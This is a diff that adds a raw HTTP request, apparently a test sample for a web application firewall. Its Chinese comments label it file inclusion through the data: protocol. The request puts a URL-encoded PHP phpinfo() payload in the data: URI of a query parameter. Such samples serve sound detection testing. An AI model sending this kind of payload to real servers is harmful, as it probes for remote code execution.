@@ -1,0 +1,9 @@
+# 文件包含_文件协议_data协议(明文)
+# 攻击者通过使用data协议实现文件包含执行代码
+GET /?id=data:text%2Fplain%2C%3C%3Fphp%20phpinfo%28%29%3B%3F%3E&bid=hd_tag_m8mv24nt HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24nt
+RM-PRO-Token: a3cb5f7bd67950d77bdb2dd9cdc98620
+RM-PRO-Time: 1742808396183
+User-Agent: curl/7.83.1
+
